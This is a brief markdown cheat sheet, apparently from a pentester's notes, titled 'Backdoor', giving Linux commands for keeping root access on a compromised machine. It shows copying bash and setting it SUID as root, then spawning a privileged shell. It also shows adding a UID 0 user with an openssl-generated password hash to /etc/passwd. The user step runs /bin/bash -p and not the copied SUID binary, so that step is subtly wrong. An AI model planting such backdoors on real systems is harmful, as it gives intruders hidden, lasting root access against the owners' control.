# Backdoor

## Priv esc - SUID

> As root

```bash
cp /bin/bash .
chmod 4777 bash
```

> As a user

```bash
/bin/bash -p
```

## Add to passwd

Create password with slat:

```bash
openssl passwd -1 -salt SALT PASSWORD
```

Add user:

```bash
echo 'USERNAME:$1$SALT$HASH:0:0:Description:/root:/bin/bash' >> /etc/passwd
```
